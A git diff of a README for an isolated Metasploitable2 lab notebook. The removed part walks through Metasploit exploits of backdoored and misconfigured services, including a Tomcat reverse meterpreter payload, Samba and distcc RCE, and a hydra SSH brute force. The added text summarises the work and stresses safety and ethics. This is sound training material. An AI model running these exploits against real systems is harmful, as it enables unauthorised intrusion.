@@ -1,207 +1,98 @@
-🧪 Day 1 – Metasploitable2 Exploitation Lab
-🎯 Target Environment
+Metasploitable2 — Lab Notebook & Learning Outcomes
 
-Victim VM: Metasploitable2 (192.168.56.102)
+Broad topic: Practical offensive security lab using Metasploitable2 — a deliberately vulnerable VM used to learn recon, service enumeration, exploitation, and safe post‑exploit analysis.
 
-Attacker VM: Kali Linux (192.168.56.101)
+Overview
 
-Network: Host-only (isolated lab, no internet)
+This repository documents a hands‑on three‑day lab exploring Metasploitable2. The goal was not to produce exploits for real systems, but to practice the full penetration‑testing workflow in a safe, isolated environment: planning → reconnaissance → enumeration → exploitation → post‑exploit enumeration → documentation and cleanup.
 
-📌 Day 1 Plan
+Lab goals / learning aims
 
-Recon → Enumeration → Exploitation → Post-Exploitation → Cleanup
+Build a repeatable, professional lab workflow for offensive security practice.
 
-Services in scope today:
+Learn and practice recon & service fingerprinting (Nmap outputs saved as .nmap / .xml / .gnmap).
 
-vsftpd (21) – FTP backdoor
+Gain hands‑on experience exploiting real, known vulnerabilities in a controlled environment (Metasploit + PoC).
 
-UnrealIRCd (6667) – IRC backdoor
+Practice post‑exploit enumeration and evidence collection (whoami, id, uname, processes, network, SUID files, sudo rights).
 
-Tomcat (8080/8180) – Weak creds → WAR upload
+Understand different payload styles (reverse, bind, single‑command) and when to use each.
 
-distcc (3632) – Remote command execution
+Develop safe lab hygiene (host‑only networking, snapshots, sanitization before committing logs).
 
-SSH (22) – Weak/default credentials
+What I did (high level)
 
-Telnet (23) – Plaintext login
+Day 1 — Setup & initial recon
 
-Samba/SMB (139,445) – Share enumeration + RCE
+Downloaded/imported Metasploitable2 to VirtualBox, configured host‑only networking and snapshots.
 
-VNC (5900) – Weak password
+Performed initial Nmap reconnaissance and identified core attack surface (FTP, SSH, Telnet, HTTP/Tomcat, SMB, VNC, IRC, distcc, PostgreSQL).
 
-PostgreSQL (5432) – Weak DB creds
+Conducted first practical exploit: vsftpd 2.3.4 backdoor via Metasploit and obtained a shell.
 
-🔎 Recon & Enumeration
+Day 2 — Targeted exploitation
 
-Example general scan (Kali):
+Built structured lab folders for scans/, exploits/, results/, screenshots/, notes/.
 
-sudo nmap -sS -sV -O -Pn 192.168.56.102 -oA scans/full
+Re‑ran baseline scans and exploited vsftpd again for practice.
+
+Exploited UnrealIRCd backdoor — tested and obtained both reverse and bind shells.
+
+Practiced consistent logging (msfconsole spools) and core post‑exploit enumeration.
+
+Day 3 — Full service coverage
+
+Completed exploitation and documentation for remaining high‑value services:
+
+Tomcat (manager WAR deploy) — meterpreter via tomcat_mgr_deploy.
+
+distcc — RCE PoC.
+
+SSH / Telnet / PostgreSQL / VNC — accessed via default/weak credentials.
+
+Samba/SMB — enumeration (enum4linux, smbclient, smbmap) and module use (usermap_script where applicable).
+
+Saved all scans, msf spools, post‑exploit outputs and screenshots (screenshots tracked or handled with Git LFS).
+
+Key commands / patterns used (examples)
+
+Baseline scan:
+
+sudo nmap -sS -sV -O -Pn <TARGET> -oA metasploitable_initial
 
 
--sS: SYN scan
+Metasploit session logging:
 
--sV: Version detection
-
--O: OS detection
-
--Pn: No ping (treat host as alive)
-
--oA scans/full: Save in all formats
-
-⚡ Exploitation Walkthroughs
-1. FTP – vsftpd 2.3.4
-
-Vuln: Backdoored version, username :) triggers shell on port 6200.
-
-sudo msfconsole
-use exploit/unix/ftp/vsftpd_234_backdoor
-set RHOSTS 192.168.56.102
-set RPORT 21
+msfconsole
+spool ~/labs/metasploitable/exploits/<service>-session.txt
+use <exploit/module>
+set RHOSTS <TARGET>
+set PAYLOAD <payload>
 exploit
+spool off
 
 
-Post-exploit:
+Post‑exploit enumeration (save outputs to results/):
 
-whoami
-id
-pwd
-ls -la
+whoami; id; uname -a; ps aux | head -n 30; ss -tulpen || netstat -tulpen; sudo -l
+find / -perm -4000 -type f | head -n 40
 
-2. IRC – UnrealIRCd 3.2.8.1
+Skills & takeaways
 
-Vuln: Supply-chain backdoor, remote RCE without authentication.
+Repeatable, auditable pen‑test workflow and good lab discipline.
 
-sudo msfconsole
-use exploit/unix/irc/unreal_ircd_3281_backdoor
-set RHOSTS 192.168.56.102
-set RPORT 6667
-exploit
+Practical experience with Metasploit modules and manual PoCs.
 
-3. Tomcat – 8080/8180
+Clear understanding of payload types (reverse vs bind) and practical trade‑offs.
 
-Vuln: Default creds (tomcat:tomcat) → WAR file deploy.
+Stronger Linux post‑exploit enumeration skills and artifact collection practices.
 
-sudo msfconsole
-use exploit/multi/http/tomcat_mgr_deploy
-set RHOSTS 192.168.56.102
-set RPORT 8180
-set HttpUsername tomcat
-set HttpPassword tomcat
-set PAYLOAD java/meterpreter/reverse_tcp
-set LHOST 192.168.56.101
-set LPORT 4444
-exploit
+Awareness of safe sharing practices: never commit unredacted credentials or private keys.
 
-4. distcc – 3632
+Safety & ethics
 
-Vuln: Unauthenticated remote command execution.
+Only run these exercises on systems you own or have explicit permission to test.
 
-sudo nmap -p3632 --script distcc-exec 192.168.56.102
+Always isolate the lab (VirtualBox Host‑only or internal network).
 
-
-or in Metasploit:
-
-use exploit/unix/misc/distcc_exec
-set RHOSTS 192.168.56.102
-set RPORT 3632
-exploit
-
-5. SSH – 22
-
-Vuln: Weak credentials.
-
-ssh msfadmin@192.168.56.102
-# password: msfadmin
-
-
-Optional brute force:
-
-hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.102
-
-6. Telnet – 23
-
-Vuln: Plaintext credentials.
-
-telnet 192.168.56.102 23
-# login: msfadmin / msfadmin
-
-7. Samba – 139/445
-
-Vuln: RCE (CVE-2007-2447), share misconfigurations.
-
-enum4linux -a 192.168.56.102 > scans/enum4linux.txt
-smbclient -L //192.168.56.102/ -N
-
-
-Exploit in Metasploit:
-
-use exploit/multi/samba/usermap_script
-set RHOSTS 192.168.56.102
-exploit
-
-8. VNC – 5900
-
-Vuln: Weak/no password.
-
-vncviewer 192.168.56.102:5900
-# try password: password
-
-9. PostgreSQL – 5432
-
-Vuln: Weak DB creds.
-
-psql -h 192.168.56.102 -U postgres
-# try password: postgres
-
-
-Metasploit module:
-
-use exploit/multi/postgres/postgres_payload
-set RHOSTS 192.168.56.102
-exploit
-
-🔍 Post-Exploitation Enumeration
-
-Once a shell is gained, run:
-
-whoami      # current user
-id          # UID/GID info
-pwd         # working directory
-ls -la      # detailed directory listing
-sudo -l     # check sudo permissions
-find / -perm -4000 -type f 2>/dev/null   # SUID binaries
-
-
-Purpose: identify privilege escalation opportunities.
-
-📝 Knowledge Check (Q&A)
-
-Q: Why is Telnet insecure?
-A: Sends credentials in plaintext, easy to sniff.
-
-Q: What’s unique about UnrealIRCd’s backdoor?
-A: It was a supply-chain compromise; attackers trojaned the official tarball.
-
-Q: How does Tomcat exploitation usually work?
-A: Weak/default creds → access Manager App → upload malicious WAR file.
-
-Q: What are SUID binaries and why check them?
-A: Executables with the set-user-ID bit set; if misconfigured, they allow privilege escalation.
-
-🧹 Cleanup
-
-Close sessions (sessions -k in Metasploit).
-
-Revert VM snapshot (e.g., before-telnet).
-
-Save all notes/scans to ~/labs/metasploitable/notes/.
-
-✅ End of Day 1:
-
-Understood service-specific vulns in Metasploitable2.
-
-Practiced exploitation via Metasploit & manual tools.
-
-Learned basic post-exploitation enumeration.
-
-Prepared Q&A for explaining vulnerabilities.
+Take snapshots before risky actions and revert after testing.
